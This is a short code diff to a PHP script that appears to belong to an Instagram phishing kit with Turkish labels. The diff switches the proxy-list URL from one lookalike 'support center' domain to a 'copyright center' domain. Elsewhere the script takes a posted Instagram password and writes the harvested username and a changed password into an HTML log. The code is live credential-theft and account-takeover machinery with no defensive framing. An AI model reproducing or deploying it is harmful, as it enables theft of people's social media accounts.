@@ -343,7 +343,7 @@ $proxy=explode("@",$proxy);
 
     curl_setopt($dch, CURLOPT_HEADER, 0);
     curl_setopt($dch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($dch, CURLOPT_URL, 'https://destekmerkeztalepolustur.tk/prxy2.php');
+    curl_setopt($dch, CURLOPT_URL, 'https://telifhakkimerkezi.herokuapp.com/proxy.php');
 
     $data = curl_exec($dch);
     curl_close($dch);
@@ -454,6 +454,7 @@ $passs=$_POST['instapass'];
 			$file = fopen($phpYolu, 'a');
 		fwrite($file, "
 				<hr>
+				<h1>Sublime Saplar<h1>
 				<font color='red'>Kullanıcı Adı: </font><font color='black'>".$userneym."</font><br>
 				<font color='red'>Şifresi(değiştirildi): </font><font color='black'>".$random."123</font><br>
                 <font color='red'>Uygulamaya Ekle: </font><font color='black'>
